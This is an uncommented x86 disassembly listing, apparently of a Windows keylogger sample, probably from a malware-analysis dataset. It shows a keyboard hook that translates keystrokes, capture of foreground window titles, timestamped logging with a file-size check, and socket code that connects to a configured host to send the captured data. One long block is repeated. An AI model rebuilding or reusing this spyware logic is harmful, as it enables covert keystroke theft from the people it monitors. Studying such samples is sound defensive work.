je r-xdata
mov eax [ eax + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
mov [ ebp - 0x2168 ] eax
push 0x2
mov eax [ ebp - 0x4 ]
push eax
call shutdown
mov eax [ ebp - 0x4 ]
push eax
call closesocket
mov eax edi
call sub_41ff18
lea eax [ ebp - 0x215c ]
call sub_403918
call sub_40305c
jmp r-xdata
cmp [ edi + 0xd ] 0x0
je r-xdata
lea eax [ ebp - 0x2010 ]
xor ecx ecx
mov edx 0x2000
call sub_403af4
push 0x0
push 0x2000
lea eax [ ebp - 0x2010 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call recv
mov esi eax
test esi esi
jg r-xdata
lea eax [ ebp - 0x217c ]
lea edx [ ebp - 0x2010 ]
call sub_405e3c
mov eax [ ebp - 0x217c ]
lea edx [ ebp - 0x2178 ]
call sub_409bd0
mov edx [ ebp - 0x2178 ]
lea eax [ ebp - 0x8 ]
call sub_4057d4
lea eax [ ebp - 0x2180 ]
push eax
mov ecx 0x7
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x2180 ]
mov edx r-xdata
call sub_405974
jne r-xdata
cmp [ edi + 0x40 ] 0x0
jne r-xdata
lea eax [ ebp - 0x2184 ]
push eax
mov ecx 0x7
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x2184 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0x7
mov edx 0x1
call sub_405a84
mov eax [ rw-data ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_4055c8
mov ecx [ rw-data ]
mov ecx [ ecx ]
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x10 ]
call sub_405864
mov edx [ ebp - 0xc ]
lea eax [ ebp - 0x215c ]
call sub_403770
mov eax [ rw-data ]
mov [ eax ] 0x1
mov edx 0x1
lea eax [ ebp - 0x215c ]
call sub_403e84
call sub_40305c
mov bl 0x1
push ebp
call sub_480860
pop ecx
jmp r-xdata
mov eax edi
call sub_41ff18
jmp r-xdata
lea eax [ ebp - 0x2188 ]
push eax
mov ecx 0x7
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x2188 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0x7
mov edx 0x1
call sub_405a84
test bl bl
je r-xdata
lea eax [ ebp - 0x218c ]
push eax
mov ecx 0x7
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x218c ]
mov edx r-xdata
call sub_405974
jne r-xdata
mov [ edi + 0x40 ] 0x1
push 0x2
mov eax [ ebp - 0x4 ]
push eax
call shutdown
mov eax [ ebp - 0x4 ]
push eax
call closesocket
mov eax edi
call sub_41ff18
jmp r-xdata
xor ebx ebx
push ebp
call sub_480860
pop ecx
jmp r-xdata
lea eax [ ebp - 0x215c ]
call sub_403918
call sub_40305c
push 0x0
lea edx [ ebp - 0x2010 ]
mov ecx esi
lea eax [ ebp - 0x215c ]
call sub_4038f8
call sub_40305c
push ebp
call sub_480860
pop ecx
test bl bl
je r-xdata
xor ebx ebx
push ebp
call sub_480860
pop ecx
jmp r-xdata
lea eax [ ebp - 0x215c ]
call sub_403918
call sub_40305c
sub_480860
push ebp
mov ebp esp
push 0x0
push 0x1
mov eax [ rw-data ]
call j_sub_4059f0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
call send
pop ebp
retn
sub_480880
push ebp
mov ebp esp
mov ecx 0x431
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
push edi
mov edi eax
xor eax eax
push ebp
push sub_480c86
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
cmp [ edi + 0x48 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_480c8d
lea eax [ ebp - 0x218c ]
mov edx 0x4
call sub_405554
lea eax [ ebp - 0x217c ]
mov edx 0x2
call sub_405d40
lea eax [ ebp - 0x2174 ]
mov edx 0x2
call sub_405554
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_405554
retn
push 0x0
push 0x1
push 0x2
call socket
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0xffffffff
je r-xdata
mov [ ebp - 0x216c ] 0x2
mov eax [ rw-data ]
movzx eax [ eax ]
push eax
call htons
mov [ ebp - 0x216a ] ax
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call inet_addr
mov esi eax
mov [ ebp - 0x2168 ] esi
inc esi
jne r-xdata
push 0x10
lea eax [ ebp - 0x216c ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call connect
push 0x0
push 0x2000
lea eax [ ebp - 0x2010 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call recv
inc eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call gethostbyname
test eax eax
je r-xdata
test bl bl
je r-xdata
lea edx [ ebp - 0x2174 ]
mov eax [ edi + 0x44 ]
call sub_409d70
mov ecx [ ebp - 0x2174 ]
lea eax [ ebp - 0x2170 ]
mov edx r-xdata
call sub_405864
mov edx [ ebp - 0x2170 ]
mov eax [ ebp - 0x4 ]
call sub_475ecc
push 0x0
push 0x2000
lea eax [ ebp - 0x2010 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call recv
inc eax
je r-xdata
mov eax [ eax + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
mov [ ebp - 0x2168 ] eax
push 0x2
mov eax [ ebp - 0x4 ]
push eax
call shutdown
mov eax [ ebp - 0x4 ]
push eax
call closesocket
mov eax edi
call sub_41ff18
lea eax [ ebp - 0x215c ]
call sub_403918
call sub_40305c
jmp r-xdata
cmp [ edi + 0xd ] 0x0
je r-xdata
lea eax [ ebp - 0x2010 ]
xor ecx ecx
mov edx 0x2000
call sub_403af4
push 0x0
push 0x2000
lea eax [ ebp - 0x2010 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call recv
mov esi eax
test esi esi
jg r-xdata
lea eax [ ebp - 0x217c ]
lea edx [ ebp - 0x2010 ]
call sub_405e3c
mov eax [ ebp - 0x217c ]
lea edx [ ebp - 0x2178 ]
call sub_409bd0
mov edx [ ebp - 0x2178 ]
lea eax [ ebp - 0x8 ]
call sub_4057d4
lea eax [ ebp - 0x2180 ]
push eax
mov ecx 0x7
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x2180 ]
mov edx r-xdata
call sub_405974
jne r-xdata
cmp [ edi + 0x40 ] 0x0
jne r-xdata
lea eax [ ebp - 0x2184 ]
push eax
mov ecx 0x7
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x2184 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0x7
mov edx 0x1
call sub_405a84
mov eax [ rw-data ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_4055c8
mov ecx [ rw-data ]
mov ecx [ ecx ]
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x10 ]
call sub_405864
mov edx [ ebp - 0xc ]
lea eax [ ebp - 0x215c ]
call sub_403770
mov eax [ rw-data ]
mov [ eax ] 0x1
mov edx 0x1
lea eax [ ebp - 0x215c ]
call sub_403e84
call sub_40305c
mov bl 0x1
push ebp
call sub_480860
pop ecx
jmp r-xdata
mov eax edi
call sub_41ff18
jmp r-xdata
lea eax [ ebp - 0x2188 ]
push eax
mov ecx 0x7
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x2188 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0x7
mov edx 0x1
call sub_405a84
test bl bl
je r-xdata
lea eax [ ebp - 0x218c ]
push eax
mov ecx 0x7
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x218c ]
mov edx r-xdata
call sub_405974
jne r-xdata
mov [ edi + 0x40 ] 0x1
push 0x2
mov eax [ ebp - 0x4 ]
push eax
call shutdown
mov eax [ ebp - 0x4 ]
push eax
call closesocket
mov eax edi
call sub_41ff18
jmp r-xdata
xor ebx ebx
push ebp
call sub_480860
pop ecx
jmp r-xdata
lea eax [ ebp - 0x215c ]
call sub_403918
call sub_40305c
push 0x0
lea edx [ ebp - 0x2010 ]
mov ecx esi
lea eax [ ebp - 0x215c ]
call sub_4038f8
call sub_40305c
push ebp
call sub_480860
pop ecx
test bl bl
je r-xdata
xor ebx ebx
push ebp
call sub_480860
pop ecx
jmp r-xdata
lea eax [ ebp - 0x215c ]
call sub_403918
call sub_40305c
sub_480d08
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov esi eax
xor eax eax
push ebp
push sub_480e13
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_40bcf8
add esp 0xfffffff8
fstp [ esp ]
fwait
lea ecx [ ebp - 0xe ]
lea edx [ ebp - 0xc ]
lea eax [ ebp - 0xa ]
call sub_40bbe0
call sub_40bcf8
add esp 0xfffffff8
fstp [ esp ]
fwait
call sub_40bc70
mov ebx eax
lea edx [ ebp - 0x4 ]
movzx eax [ ebp - 0xc ]
call sub_409d70
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
dec eax
jne r-xdata
sub eax 0x4
mov eax [ eax ]
lea edx [ ebp - 0x8 ]
movzx eax [ ebp - 0xe ]
call sub_409d70
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
lea eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x4 ]
mov edx r-xdata
call sub_405864
dec eax
jne r-xdata
sub eax 0x4
mov eax [ eax ]
lea edx [ ebp - 0x14 ]
movzx eax [ ebp - 0xa ]
call sub_409d70
push [ ebp - 0x14 ]
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0x8 ]
push r-xdata
lea edx [ ebp - 0x18 ]
movzx eax bx
call sub_409d70
push [ ebp - 0x18 ]
push r-xdata
mov eax esi
mov edx 0x8
call sub_4058e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_480e1a
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_405554
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_405554
retn
lea eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x8 ]
mov edx r-xdata
call sub_405864
sub_480e44
push ebp
mov ebp esp
add esp 0xfffffe94
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x16c ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
lea eax [ ebp - 0x168 ]
mov edx [ r-xdata ]
call sub_405fe8
xor eax eax
push ebp
push sub_480f43
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_480f00
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x16c ]
mov ecx r-xdata
mov edx [ ebp - 0x4 ]
call sub_405864
mov eax [ ebp - 0x16c ]
lea ecx [ ebp - 0x168 ]
mov edx 0x3f
call sub_40a488
mov ebx eax
test ebx ebx
jne r-xdata
lea eax [ ebp - 0x168 ]
call sub_40a4fc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
push [ esi ]
push [ ebp - 0x154 ]
push r-xdata
mov eax esi
mov edx 0x3
call sub_4058e0
lea eax [ ebp - 0x168 ]
call sub_40a4d8
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_480f4a
lea eax [ ebp - 0x16c ]
call sub_405530
lea eax [ ebp - 0x168 ]
mov edx [ r-xdata ]
call sub_4060ac
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub_480f70
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi eax
xor eax eax
push ebp
push sub_480fdd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
call sub_405530
call GetForegroundWindow
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_480fe4
lea eax [ ebp - 0x4 ]
call sub_405530
retn
push ebx
call GetWindowTextLengthA
mov esi eax
inc esi
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_405c6c
push esi
mov eax [ ebp - 0x4 ]
call sub_4059dc
push eax
push ebx
call GetWindowTextA
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_409c20
sub_480fec
push ebp
mov ebp esp
add esp 0xfffffeb0
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
xor eax eax
push ebp
push sub_48109e
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x150 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4059dc
push eax
call FindFirstFileA
cmp eax 0xffffffff
jne r-xdata
xor eax eax
push ebp
push sub_481081
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x134 ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
mov edx [ ebp - 0x10 ]
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x130 ]
xor edx edx
add eax [ ebp - 0x10 ]
adc edx [ ebp - 0xc ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
retn
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0xc ] 0x0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4810a5
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub_4810d4
push ebp
mov ebp esp
mov ecx 0xb
push 0x0
push 0x0
dec ecx
jne r-xdata
xor eax eax
push ebp
push sub_481283
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_40bcf8
add esp 0xfffffff8
fstp [ esp ]
fwait
lea eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp - 0x6 ]
lea edx [ ebp - 0x4 ]
lea eax [ ebp - 0x2 ]
call sub_40b900
call sub_40bcf8
add esp 0xfffffff8
fstp [ esp ]
fwait
lea ecx [ ebp - 0xe ]
lea edx [ ebp - 0xc ]
lea eax [ ebp - 0xa ]
call sub_40bbe0
lea edx [ ebp - 0x14 ]
mov eax r-xdata
call sub_4735e8
mov eax [ ebp - 0x14 ]
push eax
lea edx [ ebp - 0x18 ]
mov eax r-xdata
call sub_4735e8
mov eax [ ebp - 0x18 ]
push eax
lea edx [ ebp - 0x1c ]
mov eax r-xdata
call sub_4735e8
mov eax [ ebp - 0x1c ]
push eax
lea edx [ ebp - 0x20 ]
mov eax r-xdata
call sub_4735e8
mov eax [ ebp - 0x20 ]
pop edx
pop ecx
call sub_473448
lea edx [ ebp - 0x28 ]
mov eax r-xdata
call sub_4735e8
push [ ebp - 0x28 ]
lea eax [ ebp - 0x2c ]
call sub_48ce74
push [ ebp - 0x2c ]
lea edx [ ebp - 0x30 ]
movzx eax [ ebp - 0xa ]
call sub_409d70
push [ ebp - 0x30 ]
push r-xdata
lea edx [ ebp - 0x34 ]
movzx eax [ ebp - 0xc ]
call sub_409d70
push [ ebp - 0x34 ]
push r-xdata
lea edx [ ebp - 0x38 ]
movzx eax [ ebp - 0xe ]
call sub_409d70
push [ ebp - 0x38 ]
push r-xdata
lea edx [ ebp - 0x3c ]
movzx eax [ ebp - 0x2 ]
call sub_409d70
push [ ebp - 0x3c ]
lea edx [ ebp - 0x40 ]
movzx eax [ ebp - 0x2 ]
call sub_409d70
push [ ebp - 0x40 ]
lea edx [ ebp - 0x44 ]
movzx eax [ ebp - 0x4 ]
call sub_409d70
push [ ebp - 0x44 ]
lea edx [ ebp - 0x48 ]
movzx eax [ ebp - 0x6 ]
call sub_409d70
push [ ebp - 0x48 ]
lea edx [ ebp - 0x4c ]
movzx eax [ ebp - 0x8 ]
call sub_409d70
push [ ebp - 0x4c ]
push r-xdata
lea eax [ ebp - 0x24 ]
mov edx 0xe
call sub_4058e0
mov eax [ ebp - 0x24 ]
push eax
lea edx [ ebp - 0x54 ]
mov eax 0x1a
call sub_48adcc
push [ ebp - 0x54 ]
push r-xdata
lea eax [ ebp - 0x58 ]
call sub_480d08
push [ ebp - 0x58 ]
lea eax [ ebp - 0x50 ]
mov edx 0x3
call sub_4058e0
mov eax [ ebp - 0x50 ]
pop edx
call sub_473560
test al al
call sub_473540
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48128a
lea eax [ ebp - 0x58 ]
mov edx 0x12
call sub_405554
retn
sub_481318
push ebp
mov ebp esp
mov ecx 0xd
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
xor eax eax
push ebp
push sub_4816c3
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
push ebp
push sub_481687
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
cmp [ eax ] 0x1
je r-xdata
lea eax [ ebp - 0x8 ]
call sub_480f70
mov eax [ ebp - 0x8 ]
mov edx [ rw-data ]
call sub_405974
je r-xdata
push 0x0
call ExitThread
mov eax rw-data
mov edx [ ebp - 0x4 ]
call sub_405818
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48168e
mov eax rw-data
mov edx [ ebp - 0x8 ]
call sub_405584
retn
lea eax [ ebp - 0x2c ]
call sub_480d08
mov edx [ ebp - 0x2c ]
mov eax [ rw-data ]
call sub_405974
je r-xdata
lea edx [ ebp - 0x44 ]
mov eax 0x1a
call sub_48adcc
push [ ebp - 0x44 ]
push r-xdata
lea eax [ ebp - 0x48 ]
call sub_480d08
push [ ebp - 0x48 ]
lea eax [ ebp - 0x40 ]
mov edx 0x3
call sub_4058e0
mov eax [ ebp - 0x40 ]
call sub_40a26c
test al al
je r-xdata
xor eax eax
push ebp
push sub_4813c1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax rw-data
call sub_403918
call sub_40305c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax rw-data
call sub_403500
call sub_40305c
mov eax rw-data
call sub_40350c
call sub_40305c
jmp r-xdata
lea edx [ ebp - 0x34 ]
mov eax 0x1a
call sub_48adcc
push [ ebp - 0x34 ]
push r-xdata
lea eax [ ebp - 0x38 ]
call sub_480d08
push [ ebp - 0x38 ]
lea eax [ ebp - 0x30 ]
mov edx 0x3
call sub_4058e0
mov edx [ ebp - 0x30 ]
mov eax rw-data
call sub_403770
lea eax [ ebp - 0x3c ]
call sub_480d08
mov edx [ ebp - 0x3c ]
mov eax rw-data
call sub_405584
mov eax rw-data
call sub_403918
call sub_40305c
mov eax rw-data
call sub_405530
mov eax [ rw-data ]
mov [ ebp - 0x50 ] eax
mov ebx [ ebp - 0x50 ]
test ebx ebx
je r-xdata
call sub_40bcc4
fstp [ ebp - 0x20 ]
fwait
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
mov edx [ rw-data ]
mov edx [ edx ]
lea eax [ ebp - 0x10 ]
call sub_40c8f8
push r-xdata
push [ rw-data ]
push r-xdata
push [ ebp - 0x10 ]
push r-xdata
push r-xdata
push [ rw-data ]
push r-xdata
lea eax [ ebp - 0x4c ]
mov edx 0x8
call sub_4058e0
mov edx [ ebp - 0x4c ]
mov eax rw-data
call sub_405cd0
call sub_4040ac
call sub_40305c
lea eax [ ebp - 0xc ]
call sub_4810b0
mov eax [ ebp - 0xc ]
mov edx [ rw-data ]
call sub_405974
je r-xdata
call sub_40bcc4
fstp [ ebp - 0x28 ]
fwait
push [ ebp - 0x24 ]
push [ ebp - 0x28 ]
mov edx [ rw-data ]
mov edx [ edx ]
lea eax [ ebp - 0x14 ]
call sub_40c8f8
push r-xdata
lea edx [ ebp - 0x58 ]
mov eax ebx
call sub_409d70
push [ ebp - 0x58 ]
push r-xdata
push [ ebp - 0x14 ]
push r-xdata
push r-xdata
push [ rw-data ]
push r-xdata
lea eax [ ebp - 0x54 ]
mov edx 0x8
call sub_4058e0
mov edx [ ebp - 0x54 ]
mov eax rw-data
call sub_405cd0
call sub_4040ac
call sub_40305c
mov eax rw-data
mov edx [ ebp - 0xc ]
call sub_405584
xor eax eax
push ebp
push sub_48163c
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x5c ]
mov eax r-xdata
call sub_4735e8
mov eax [ ebp - 0x5c ]
mov edx r-xdata
call sub_405974
jne r-xdata
sub ebx 0x4
mov ebx [ ebx ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax 0x1a
call sub_48adcc
push [ ebp - 0x64 ]
push r-xdata
lea eax [ ebp - 0x68 ]
call sub_480d08
push [ ebp - 0x68 ]
lea eax [ ebp - 0x60 ]
mov edx 0x3
call sub_4058e0
mov eax [ ebp - 0x60 ]
call sub_480fec
push edx
push eax
lea edx [ ebp - 0x6c ]
mov eax r-xdata
call sub_4735e8
mov eax [ ebp - 0x6c ]
call sub_409edc
shl eax 0xa
cdq
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jge r-xdata
cmp eax [ esp ]
pop edx
pop eax
jae r-xdata
mov eax [ rw-data ]
push eax
push 0x0
push 0x0
push sub_4810d4
push 0x0
push 0x0
call CreateThread
jmp r-xdata
sub_48168e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4816ca
lea eax [ ebp - 0x6c ]
mov edx 0x7
call sub_405554
lea eax [ ebp - 0x4c ]
mov edx 0x9
call sub_405554
lea eax [ ebp - 0x14 ]
mov edx 0x5
call sub_405554
retn
sub_481780
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
xor eax eax
push ebp
push sub_48187c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp al 0xd
je r-xdata
lea eax [ ebp - 0x8 ]
call sub_480f70
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp al 0xd
jne r-xdata
cmp al 0x20
jne r-xdata
mov eax rw-data
mov edx r-xdata
call sub_405818
mov eax rw-data
mov edx r-xdata
call sub_405818
jmp r-xdata
mov eax rw-data
mov edx [ ebp - 0x4 ]
call sub_405818
lea eax [ ebp - 0x10 ]
mov ecx [ rw-data ]
mov edx r-xdata
call sub_405864
mov eax [ ebp - 0x10 ]
call sub_475e2c
push r-xdata
push [ ebp - 0x8 ]
push r-xdata
push [ rw-data ]
lea eax [ ebp - 0xc ]
mov edx 0x4
call sub_4058e0
mov eax [ ebp - 0xc ]
call sub_475e2c
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ rw-data ]
call sub_405974
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_481883
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_405554
retn
mov eax rw-data
call sub_405530
mov eax rw-data
mov edx [ ebp - 0x8 ]
call sub_405584
jmp r-xdata
sub_4818e0
push ebx
mov ebx eax
push 0x0
push ebx
call MapVirtualKeyA
cmp eax 0x1a
jne r-xdata
xor eax eax
pop ebx
retn
mov al 0x1
pop ebx
retn
sub_4818f8
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
push edi
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_481d86
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
push ebp
push sub_481d4d
push [ fs : edx ]
mov [ fs : edx ] esp
xor ebx ebx
mov esi [ ebp + 0x10 ]
cmp [ ebp + 0x8 ] 0x0
jl r-xdata
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
push eax
call CallNextHookEx
cmp [ ebp + 0x8 ] 0x3
jne r-xdata
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
push eax
call CallNextHookEx
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ ebp + 0xc ] 0x100
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_481d8d
lea eax [ ebp - 0x4 ]
call sub_405530
retn
mov eax [ esi ]
call sub_4818e0
test al al
je r-xdata
cmp [ ebp + 0xc ] 0x104
jne r-xdata
mov eax [ esi ]
cmp eax 0x2e
jg r-xdata
mov bl 0x1
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
push eax
call CallNextHookEx
add eax 0xffffff90
cmp eax 0x20
ja r-xdata
je r-xdata
push 0x14
call GetKeyState
and ax 0x1
cmp ax 0x1
sete al
push 0x11
call GetKeyState
and ax 0x80
cmp ax 0x80
sete al
push 0xa0
call GetKeyState
and ax 0x80
cmp ax 0x80
sete al
push 0xa1
call GetKeyState
and ax 0x80
cmp ax 0x80
sete al
test bl bl
jne r-xdata
jmp [ eax * 4 + jump_table_481a60 ]
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4055c8
jmp r-xdata
add eax 0xfffffff8
cmp eax 0x25
ja r-xdata
mov eax [ ebp - 0x4 ]
call sub_481318
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
lea eax [ ebp - 0x104 ]
push eax
call GetKeyboardState
call sub_40f310
test eax eax
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4055c8
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4055c8
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4055c8
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4055c8
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4055c8
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4055c8
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4055c8
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4055c8
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4055c8
jmp r-xdata
jmp [ eax * 4 + jump_table_4819b5 ]
mov eax [ ebp - 0x4 ]
call sub_481780
lea eax [ ebp - 0x4 ]
mov edx 0x2
call sub_405c6c
push 0x0
lea eax [ ebp - 0x4 ]
call j_sub_4059f0
push eax
lea eax [ ebp - 0x104 ]
push eax
push 0x0
mov ebx [ esi ]
push ebx
call MapVirtualKeyA
push eax
push ebx
call ToAscii
sub eax 0x1
jb r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4055c8
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4055c8
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4055c8
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4055c8
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4055c8
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4055c8
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4055c8
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4055c8
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4055c8
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4055c8
jmp r-xdata
lea eax [ ebp - 0x4 ]
call sub_405530
jmp r-xdata
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx 0x1
call sub_405c6c
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
lea eax [ ebp - 0x4 ]
call sub_405530
sub_481d52
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
push eax
call CallNextHookEx
mov ebx eax
call sub_404f40
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_481d8d
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub_482033
